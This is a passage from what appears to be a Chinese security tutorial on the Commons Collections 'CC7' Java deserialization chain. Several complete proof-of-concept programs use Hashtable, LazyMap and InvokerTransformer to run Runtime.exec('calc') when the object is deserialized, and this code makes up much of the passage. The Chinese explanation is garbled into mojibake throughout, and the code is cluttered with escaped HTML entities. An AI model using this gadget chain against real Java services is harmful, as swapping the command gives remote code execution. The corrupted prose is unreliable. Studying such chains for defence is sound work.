if (length \u0026gt; elements \u0026amp;\u0026amp; (length \u0026amp; 1) == 0) length--; length = Math.min(length, origlength); if (length \u0026lt; 0) { // overflow length = origlength; } SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length); Hashtable.UnsafeHolder.putLoadFactor(this, lf); table = new Entry\u0026lt;?,?\u0026gt;[length]; threshold = (int)Math.min(length * lf, MAX_ARRAY_SIZE + 1); count = 0; for (; elements \u0026gt; 0; elements--) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K)s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V)s.readObject(); // sync is eliminated for performance reconstitutionPut(table, key, value); } } é‡ç‚¹è¿˜æ˜¯æœ€åé¢é‚£ä¸²ä»£ç ï¼Œå¦‚ä¸‹ï¼š åœ¨readObjectæ–¹æ³•ä¸­ï¼Œæœ€åè°ƒç”¨äº†reconstitutionPutæ–¹æ³•å°†ååºåˆ—åŒ–å¾—åˆ°çš„key-value æ”¾åœ¨å†…éƒ¨å®ç°çš„ Entry æ•°ç»„ tableé‡Œã€‚\nè·Ÿè¿›reconstitutionPutæ–¹æ³•æºç ï¼š\nå¯ä»¥çœ‹è§è¿™ä¸ªreconstitutionPut()é‡Œé¢ä¹Ÿè°ƒç”¨äº†hashCodeï¼Œå¹¶ä¸”å¯ä»¥å¾ˆå®¹æ˜“çœ‹å‡ºvalueä¸èƒ½ä¸ºnullã€‚æ„Ÿè§‰å’ŒHashMapæ˜¯å·®ä¸å¤šçš„ï¼Œçœ‹ä¸€ä¸‹Hashtableç±»çš„put()æ–¹æ³•ï¼š å’ŒCC6é‚£å°±å·®ä¸å¤šäº†ï¼Œè¿™ä¸å°±ç›´æ¥å¯ä»¥æ„é€ äº†å—\nç›´æ¥æŒ‰ç…§CC6çš„HashMapçš„é“¾å­åŸç†æ„é€ ä»£ç å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); Hashtable hashMap = new Hashtable(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//è¿™é‡Œæ³¨æ„fupancæ‰€å±å¯¹è±¡ï¼Œä½¿ç”¨lazyä¹Ÿè¡Œ Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nequals ä½†æ˜¯ysoserialé“¾ä¸­çš„åˆ©ç”¨ç‚¹å´ä¸æ˜¯ä¸Šé¢é‚£ä¸ªç®€å•é“¾ï¼Œç»§ç»­åˆ†æè¿™ä¸ªHashtableç±»çš„ä»£ç ã€‚\nå…ˆç»™å‡ºåˆ©ç”¨é“¾è¦ç”¨åˆ°çš„ç±»ä»¥åŠå¯¹åº”æ–¹æ³•çš„æºç ï¼š\nHashMapçš„çˆ¶ç±»AbstractMapç±»çš„equals()æ–¹æ³•æºç ï¼ˆgetæ–¹æ³•çš„èµ·ç‚¹ï¼‰ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; if (m.size() != size()) return false; try { Iterator\u0026lt;Entry\u0026lt;K,V\u0026gt;\u0026gt; i = entrySet().iterator(); while (i.hasNext()) { Entry\u0026lt;K,V\u0026gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null \u0026amp;\u0026amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key)))//è¿™é‡Œè°ƒç”¨äº†getæ–¹æ³• return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } LazyMapçš„çˆ¶ç±»AbstractMapDecoratorçš„equals()æ–¹æ³•æºç ï¼š\n1 2 3 public boolean equals(Object object) { return object == this ? true : this.map.equals(object); } åœ¨Hashtable çš„readObject() æ–¹æ³•ä¸­ç”¨åˆ°äº†forå¾ªç¯ï¼Œå¦‚ä¸‹ï¼š\nè¿™é‡Œçš„elementsä»£è¡¨é”®å€¼å¯¹çš„ä¸ªæ•°ï¼Œè¿™é‡Œè°ƒç”¨forå¾ªç¯æ¥ä¸€æ¬¡è¯»å–ä¸€ä¸ªé”®å€¼å¯¹ã€‚å¹¶ä¸”åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œtable(ä¹Ÿå°±æ˜¯reconstitutionæ–¹æ³•å†…çš„tab)æ˜¯å…±äº«çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨æ•´ä¸ªååºåˆ—åŒ–è¿‡ç¨‹ä¸­å§‹ç»ˆä½¿ç”¨åŒä¸€ä¸ª tabï¼Œæ‰€æœ‰çš„é”®å€¼å¯¹éƒ½å°†è¢«æ’å…¥åˆ°åŒä¸€ä¸ª tab ä¸­ï¼Œæ„æˆä¸€ä¸ªå®Œæ•´çš„å“ˆå¸Œè¡¨ï¼Œå¹¶ä¸”çœ‹Hashtableç±»ä¸­ä¹Ÿæœ‰è¿™ä¸ªå˜é‡ï¼š\ntableåœ¨Hashtableä¹Ÿæ˜¯æœ‰å®šä¹‰çš„ï¼Œç»“åˆå‰é¢çš„è¯´æ˜ï¼Œå¯ä»¥çŸ¥é“åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå°†é”®å€¼å¯¹æ”¾å…¥åˆ°è¿™ä¸ªæ•°ç»„ä¸­ï¼Œä½†æ˜¯è¿™é‡Œçš„tableæ˜¯transientä¿®é¥°çš„ï¼Œå¯¼è‡´ä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¿™æ˜¯å¦‚ä½•è§£å†³çš„å‘¢ï¼Ÿé‡ç‚¹å°±æ˜¯åœ¨Hashtable#writeObject()æ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 private void writeObject(java.io.ObjectOutputStream s) throws IOException { Entry\u0026lt;Object, Object\u0026gt; entryStack = null; synchronized (this) { s.defaultWriteObject(); s.writeInt(table.length); s.writeInt(count); for (int index = 0; index \u0026lt; table.length; index++) { Entry\u0026lt;?,?\u0026gt; entry = table[index]; while (entry != null) { entryStack = new Entry\u0026lt;\u0026gt;(0, entry.key, entry.value, entryStack); entry = entry.next; } } } while (entryStack != null) { s.writeObject(entryStack.key); s.writeObject(entryStack.value); entryStack = entryStack.next; } } åœ¨è¿™ä¸ªwriteObject()æ–¹æ³•ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ªentryStackç”¨äºæš‚æ—¶å­˜å‚¨æ‰€æœ‰çš„é”®å€¼å¯¹ï¼Œèµ‹å€¼å°±æ˜¯åœ¨forå¾ªç¯ä¸­ï¼Œåœ¨è¿™ä¸ªforå¾ªç¯ä¸­ï¼Œéå†tableæ•°ç»„çš„æ¯ä¸ªEntryå¯¹è±¡ï¼Œå°†å…¶å¡«å…¥entryStackæ•°ç»„ä¸­ï¼Œæœ€ååœ¨whileå¾ªç¯ä¸­å°†æ¯ä¸ªé”®å€¼å¯¹åºåˆ—åŒ–ã€‚\nç»§ç»­çœ‹reconstitutionput()æ–¹æ³•ï¼š\nè¿™ä¸ªforå¾ªç¯ä»£ç ä¼šéå†é“¾è¡¨ï¼Œç›´åˆ°é“¾è¡¨æœ«å°¾ã€‚åŒæ—¶åœ¨forå¾ªç¯å†…éƒ¨ï¼Œå¯ä»¥çœ‹åˆ°åªè¦å½“å‰èŠ‚ç‚¹çš„å“ˆå¸Œå€¼ä¸ç›®æ ‡å“ˆå¸Œå€¼ç›¸ç­‰ä»¥åŠå½“å‰èŠ‚ç‚¹çš„é”®ä¸ç›®æ ‡é”®ç›¸ç­‰å°±ä¼šæŠ›å‡ºå¼‚å¸¸\næ‰€ä»¥è¿™ä¸ªä»£ç çš„ä½œç”¨å°±æ˜¯ç¡®ä¿å“ˆå¸Œè¡¨ä¸­ä¸ä¼šå‡ºç°é‡å¤çš„é”®ã€‚å¦‚æœåœ¨éå†é“¾è¡¨è¿‡ç¨‹ä¸­å‘ç°æœ‰èŠ‚ç‚¹çš„å“ˆå¸Œå€¼å’Œé”®éƒ½ä¸ç›®æ ‡å€¼ç›¸åŒï¼Œå°±ä¼šæŠ›å‡º StreamCorruptedException å¼‚å¸¸ã€‚è¿™å¯èƒ½ç”¨äºåºåˆ—åŒ–/ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œé˜²æ­¢æ•°æ®ç»“æ„è¢«ç ´åæˆ–å‡ºç°ä¸ä¸€è‡´çš„æƒ…å†µã€‚\nå¦‚æœæ²¡æœ‰é‡å¤çš„é”®ï¼Œåœ¨è¿™ä¸ªforå¾ªç¯è¿‡åï¼Œå°†ä¼šå°†è¿™ä¸ªé”®å€¼å¯¹å¡«å…¥åˆ°tableæ•°ç»„ä¸­ï¼š\næ—¢ç„¶è¿™é‡Œéƒ½è¯´æ˜äº†æ˜¯åˆ©ç”¨equal()æ–¹æ³•æ¥åˆ›å»ºåˆ©ç”¨é“¾ï¼Œåœ¨è¿™ä¸ªreconstitutionPut()æ–¹æ³•æºç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åœ¨forå¾ªç¯é‚£é‡Œè¦åˆ©ç”¨åˆ°äº†equals()æ–¹æ³•ï¼š\nç”±äºjavaä¸­çš„\u0026amp;\u0026amp;æœ‰çŸ­è·¯æ±‚å€¼çš„ç‰¹æ€§ï¼Œå¿…é¡»è¦å‰ä¸€ä¸ªæ¡ä»¶ï¼ˆe.hash == hashï¼‰ä¸ºçœŸï¼Œæ‰ä¼šè¿›è¡Œç¬¬äºŒä¸ªæ¡ä»¶ï¼ˆe.key.equals(key)ï¼‰çš„åˆ¤æ–­ã€‚\næ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè‡³å°‘putè¿›ä¸¤ä¸ªé”®å€¼å¯¹ï¼Œè¿™æ ·åœ¨ç¬¬äºŒä¸ªé”®å€¼å¯¹ä¸ç¬¬ä¸€ä¸ªé”®å€¼å¯¹æ¯”è¾ƒæ—¶æ‰æœ‰å¯èƒ½é€šè¿‡ç¬¬ä¸€ä¸ªæ¡ä»¶ã€‚\nå†ç»“åˆå‰é¢æå‰ç»™å‡ºçš„ç±»ï¼Œå¤§æ¦‚å¯ä»¥çŸ¥é“åˆ©ç”¨é“¾äº†ï¼Œè¿™é‡Œå°†e.keyè®¾ç½®ä¸ºLazyMapç±»å®ä¾‹ï¼Œä½†æ˜¯LazyMapä¸­å¹¶æ²¡æœ‰ç›´æ¥å®šä¹‰equals()æ–¹æ³•ï¼ˆå†…éƒ¨ç±»æœ‰ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨ï¼‰ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨LazyMapçš„çˆ¶ç±»AbstractMapDecoratorçš„equals()æ–¹æ³•ï¼š\nè¿™é‡Œçš„this å…³é”®å­—åœ¨æ–¹æ³•ä¸­ä»£è¡¨å½“å‰ç±»çš„å®ä¾‹ï¼Œå³è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡ã€‚å¦‚æœç›¸åŒå°±ä¼šç›´æ¥è¿”å›tureï¼Œå¦åˆ™å°±ä¼šè°ƒç”¨åé¢çš„ã€‚è€Œæˆ‘ä»¬çš„åˆ©ç”¨é“¾å°±æ˜¯è¦è°ƒç”¨åé¢çš„ã€‚\nç”±äºæˆ‘ä»¬å®ä¾‹åŒ–LazyMapæ—¶ï¼Œéƒ½æ˜¯ä¼ å…¥ä¸€ä¸ªHashMapç±»å®ä¾‹ï¼Œæœ€ç»ˆä¼šå°†AbstractMapDecoratorçš„this.mapè®¾ç½®ä¸ºHashMapç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨HashMapç±»çš„equals()æ–¹æ³•ï¼Œä½†æ˜¯æƒ…å†µåŒLazyMapä¸€æ ·ï¼Œä¼šç›´æ¥è°ƒç”¨çˆ¶ç±»AbstractMapçš„equals()æ–¹æ³•ï¼ˆéƒ¨åˆ†æºç ï¼‰ï¼š\nç„¶ååœ¨AbstractMapçš„equals()æ–¹æ³•ä¸­è°ƒç”¨äº†get()æ–¹æ³•ï¼Œè¿™å°±æ˜¯èµ·ç‚¹ï¼Œå¹¶ä¸”è¿™é‡Œçš„må°±æ˜¯e.key.equals(key)ä¸­çš„ç¬¬äºŒä¸ªkeyï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸¤ä¸ªLazyMapå®ä¾‹ã€‚\nå¤§æ¦‚å°±æ˜¯è¿™æ ·äº†ï¼Œç°åœ¨æ¥æ“ä»£ç ã€‚\nç»¼åˆå‰é¢çš„é—®é¢˜ï¼š\néœ€è¦ä¼ å…¥ä¸¤ä¸ªé”®å€¼å¯¹ã€‚éœ€è¦å°†e.keyè®¾ç½®ä¸ºLazyMapå¯¹è±¡ï¼Œå³keyéƒ½æ˜¯LazyMapå¯¹è±¡ hashç›¸ç­‰é—®é¢˜ å…ˆç»™ä¸ªåŸºæœ¬ç›˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Hashtable; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); Hashtable hashtable = new Hashtable(); //è¿™é‡Œå¼€å§‹æƒ³ä»£ç  Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } ç°åœ¨èšç„¦äºreadObject()çš„reconstitutionPutæ–¹æ³•ï¼š\nè¿™é‡Œè¦æ±‚å‰é¢çš„æ¡ä»¶ç›¸ç­‰ï¼Œå¹¶ä¸”åé¢çš„e.keyéœ€è¦ä¸ºLazyMapç±»å®ä¾‹ï¼Œé‚£ä¹ˆæˆ‘å°±ä¼ å…¥ä¸¤ä¸ªLazyMapç±»å®ä¾‹\n1 2 3 4 5 6 7 8 9 10 Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); Hashtable haha = new Hashtable(); haha.put(lazy0,1); haha.put(lazy1,1); å†ç²˜è¿‡æ¥Hashtableç±»çš„putæ–¹æ³•ä¸€ä¸‹ï¼š è¿™æ ·å°±å¯ä»¥åŸºæœ¬è¯´æ˜ä¸ºä»€ä¹ˆæˆ‘å¯ä»¥è°ƒç”¨Hashtableçš„putæ–¹æ³•äº†ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ç¬¬ä¸€æ¬¡putä¸ä¼šè§¦åŠforå¾ªç¯ï¼Œå› ä¸ºtableæ— ä»»ä½•æ¡ç›®ï¼Œç¬¬äºŒæ¬¡putæ‰ä¼šå¼€å§‹æ¯”è¾ƒï¼‰ã€‚\nä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“æˆ‘ä¼ å…¥äº†LazyMapå®ä¾‹ï¼Œæ— è®ºæ˜¯ååºè¿˜æ˜¯putæ–¹æ³•è¿™é‡Œï¼Œåœ¨key.hashCode()éƒ½ä¸ä¼šæ˜¯é¦–å…ˆè°ƒç”¨é»˜è®¤çš„String.javaçš„hashCode()æ–¹æ³•äº†ï¼Œç”±äºLazyMapæ²¡æœ‰å®šä¹‰hashCodeæ–¹æ³•ï¼Œè¿™é‡Œå°±ä¼šåˆ°çˆ¶ç±»AbstractMapDecoratorçš„hashCodeæ–¹æ³•ï¼š\nè¿™é‡Œå°±ä¼šåˆåˆ°HashMapï¼ˆHashMapå†…éƒ¨ç±»æœ‰hashCodeï¼Œä¸å¯ç”¨ï¼‰çˆ¶ç±»AbstractMapçš„hashCode()æ–¹æ³•ï¼š ï¼ˆè¿™é‡Œå¾€åçš„hashCode()æ–¹æ³•è°ƒç”¨è¿‡ç¨‹æ˜¯åé¢çš„æŸä¸ªæµ‹è¯•ä»£ç è°ƒè¯•å‡ºæ¥çš„ï¼Œå¯ä»¥å…ˆåªæš‚æ—¶äº†è§£ï¼‰ç„¶åè¿™é‡Œè°ƒç”¨çš„hashCodeæ˜¯HashMapå†…éƒ¨ç±»Nodeç±»çš„hashCode()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\nç„¶åå·®ä¸å¤šå°±åˆ°äº†String.javaçš„hashCodeæ–¹æ³•ï¼š\nString.javaçš„hashCode()å°±æ˜¯ç”¨æ¥è®¡ç®—å“ˆå¸Œç çš„ã€‚åŒæ—¶æ³¨æ„ï¼ˆé‡è¦ï¼‰ï¼šåœ¨ä¸Šä¸Šé¢é‚£ä¸ªhashCode()ï¼Œä¹Ÿå°±æ˜¯å†…éƒ¨ç±»Nodeçš„hashCode()æ–¹æ³•å¯¹keyå’Œvalueéƒ½è°ƒç”¨äº†hashCode()è®¡ç®—å“ˆå¸Œç åå¼‚æˆ–æ±‚å¾—å€¼ï¼Œä¹Ÿå°±æ˜¯æœ€ç»ˆçš„å“ˆå¸Œç ï¼Œæ‰€ä»¥å¯¹äºæœ€ç»ˆçš„å“ˆå¸Œç æˆ‘ä»¬éœ€è¦å…¼é¡¾é”®å’Œå€¼ã€‚\nâ€”â€”â€”â€”\nç»“åˆString.javaçš„hashCodeæ–¹æ³•ï¼Œå¯ä»¥çŸ¥é“AbstractMapçš„hashCodeæ–¹æ³•çš„ä½œç”¨å°±æ˜¯è®¡ç®—å“ˆå¸Œç ï¼Œé€šè¿‡è¿­ä»£å™¨éå†æ¯ä¸ªæ¡ç›®ï¼Œè°ƒç”¨æ¯ä¸ªæ¡ç›®çš„hashCode()æ–¹æ³•ï¼Œç„¶åå°†å¾—åˆ°çš„å“ˆå¸Œç ç´¯åŠ åˆ°å˜é‡hä¸­ã€‚æœ€åè¿”å›hã€‚\nä½†æ˜¯ç”±äºæˆ‘ä»¬æœ€å¼€å§‹è°ƒç”¨çš„hashCode()æ˜¯LazyMapå¯¹è±¡ï¼Œå¹¶ä¸”ç”±äºè¿™ä¸ªå¯¹è±¡é‡Œé¢å¹¶æ²¡æœ‰å­˜å‚¨æœ‰é”®å€¼å¯¹ï¼Œæ‰€ä»¥è¿™é‡Œä¼šç›´æ¥è¿”å›0ã€‚\næœ¬æ¥æˆ‘è¿˜ä»¥ä¸ºåˆšå¥½ï¼Œè¿™æ ·éƒ½è¿”å›0çš„è¯æ­£å¥½ä½¿å¾—e.hash=hashå¯ä»¥æˆç«‹ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“æˆ‘ä»¬åœ¨åºåˆ—åŒ–ä¹‹å‰è°ƒç”¨put()çš„æ—¶å€™ï¼Œçœ‹put()æ–¹æ³•çš„å¦‚ä¸‹æºç ï¼š\nä»–è¿™é‡Œä¹Ÿæœ‰ä¸ªforå¾ªç¯æ¥é˜²æ­¢æœ‰é‡å¤çš„é”®ï¼Œè¿™ä¸ªä»£ç çš„ä½œç”¨å°±æ˜¯å¦‚æœæ¡ä»¶æˆç«‹ï¼Œä¹Ÿå°±æ˜¯æ¡ç›®ç›¸åŒ¹é…ï¼Œå°±ä¼šå°†æ¡ç›®entryå¯¹åº”çš„é”®çš„valueæ›´æ”¹ä¸ºæ–°çš„valueã€‚å†æ¥çœ‹æˆ‘ä»¬çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); Hashtable haha = new Hashtable(); haha.put(lazy0,1); haha.put(lazy1,1); ç°åœ¨çš„é—®é¢˜å°±æ˜¯æƒ³è¿™ä¸ªentry.key.equals(key)æ˜¯å¦ä¼šé€šè¿‡å¯¼è‡´æ— æ³•æ­£å¸¸æ”¾å…¥ä¸¤ä¸ªé”®å€¼å¯¹ã€‚\nç›´æ¥ä»ç¬¬äºŒæ¬¡æ”¾å…¥é”®å€¼å¯¹å¼€å§‹è¯´ï¼Œè¿™é‡Œç”±äºæˆ‘æ”¾å…¥çš„æ˜¯LazyMapç±»å®ä¾‹ï¼Œæœ¬æ¥ä»¥ä¸ºä¼šæŒ‰ç…§æˆ‘ä»¬å‰é¢è¯´çš„æµç¨‹èµ°ä¸€éï¼Œæœ€åä¼šè°ƒç”¨åˆ°AbstractMapç±»çš„equals()åœä¸‹ï¼Œå¤§é”™ç‰¹é”™ã€‚çœ‹ä»£ç \nç›´æ¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥æµ‹è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } //output:ç›¸ç­‰ è¿™é‡Œçš„è¾“å‡ºä¸ºç›¸ç­‰ï¼Œé‚£è¿™å°±æ˜¯è¯´æ˜ä¼šè¿›å…¥ifæ¡ä»¶ï¼Œå¯¼è‡´ä¸èƒ½æˆåŠŸæ”¾å…¥ä¸¤ä¸ªé”®å€¼å¯¹ã€‚ä½†æ˜¯åœ¨å‰é¢çš„åˆ†æä¸­ï¼Œå¦‚æœæƒ³è¦æˆåŠŸæ„é€ åˆ©ç”¨é“¾ï¼Œé‚£ä¹ˆå°±å¿…é¡»æ˜¯ä¼ å…¥ä¸¤ä¸ªLazyMapçš„å®ä¾‹ã€‚æ‰€ä»¥è¿™é‡Œè¦æƒ³å¦‚ä½•è§£å†³ã€‚æ‰“æ–­ç‚¹æ¥è°ƒè¯•ä¸€ä¸‹ï¼š ç›´æ¥æŒ‰ç…§é¢„æœŸè¿›å…¥åˆ°LazyMapçˆ¶ç±»AbstractMapDecoratorçš„equals()æ–¹æ³•ï¼š åœ¨å‰é¢åŸºæœ¬æµç¨‹é‚£é‡Œè¯´è¿‡ï¼Œè¿™é‡Œå°±æ˜¯åˆ¤æ–­è°ƒç”¨è¿™ä¸ªequals()æ–¹æ³•çš„å¯¹è±¡å’Œä¼ å…¥çš„objectå¼•ç”¨çš„å¯¹è±¡æ˜¯å¦ç›¸åŒï¼Œå¾ˆä¸å·§çš„æ˜¯æˆ‘ä»¬éƒ½ä¼ å…¥äº†LazyMapå¯¹è±¡ï¼Œå¯¼è‡´äº†è¿™é‡Œä½¿å¾—æ¡ä»¶æˆç«‹ï¼Œè¿”å›trueã€‚\nä½†æ˜¯ï¼ŒæŸ³æš—èŠ±æ˜åˆä¸€æ‘ï¼Œåœ¨è°ƒè¯•æ—¶ï¼Œåœ¨ä¸Šé¢ç‚¹å‡»ä¸‹ä¸€æ­¥åï¼Œçœ‹ï¼š\nè¿™é‡Œè¿˜è¦è°ƒç”¨ä¸€æ¬¡size()æ–¹æ³•ï¼ˆè¿™ä¸ªsize()æ–¹æ³•è¿‡åå°±æ²¡æŒ‰ç…§é¢„æœŸèµ°äº†ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨HashMapçš„size()æ–¹æ³•\nè¿™ä¸ªHashMapçš„size()æ–¹æ³•åªæ˜¯è¿”å›å½“å‰ HashMap ä¸­å­˜å‚¨çš„é”®å€¼å¯¹çš„æ€»æ•°ã€‚\nè¿™é‡Œæåˆ°äº†é”®å€¼å¯¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹è¯•è¯•ï¼Œè¿™é‡Œç›´æ¥å¯¹LazyMapå¯¹è±¡ä½¿ç”¨putä¹Ÿè¡Œï¼Œå› ä¸ºLazyMapçš„çˆ¶ç±»å®ç°äº†putæ–¹æ³•ï¼š ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;xxx\u0026#34;,2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;xxx\u0026#34;,1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } è¿™æ¬¡æ²¡æœ‰è¾“å‡ºï¼Œè¯´æ˜è¿™é‡Œä¸ç›¸åŒäº†ï¼Œä¸ä¼šè¿›å…¥falseï¼Œä¹Ÿå°±å¯ä»¥æ”¾å…¥ä¸¤ä¸ªå€¼äº†ã€‚\nï¼ˆé—ç•™ä¸€ä¸ªé—®é¢˜å§ï¼Œæ²¡è°ƒå‡ºæ¥è¿™é‡Œä¸ºä»€ä¹ˆä¼šç›´æ¥åˆ°size()å¹¶ä¸”å½±å“åˆ¤æ–­ï¼‰\nå¹¶ä¸”è¿™é‡Œåœ¨è°ƒè¯•æ—¶ç¡®å®å¯ä»¥è¿›å…¥åˆ°æœ€åçš„AbstractMapçš„equals()æ–¹æ³•å¹¶ä¸”æœ€ç»ˆæˆåŠŸè°ƒç”¨LazyMapçš„getæ–¹æ³•ï¼š 